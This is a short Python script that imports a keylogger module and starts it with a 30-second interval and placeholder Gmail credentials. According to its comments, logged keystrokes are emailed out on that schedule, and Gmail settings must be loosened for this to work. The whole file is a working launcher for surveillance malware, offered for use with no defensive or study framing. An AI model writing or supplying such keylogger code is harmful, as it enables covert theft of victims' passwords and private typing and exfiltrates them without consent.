#!usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(30, "mail@gmail.co", "password")    #Enter the duration to send an email ( in sec ), email address and password of your email_account 
my_keylogger.start()
# Note: Make sure to enable "Less secure app access" in your Gmail account settings for this to work.
# Also, consider using an app password for better security.

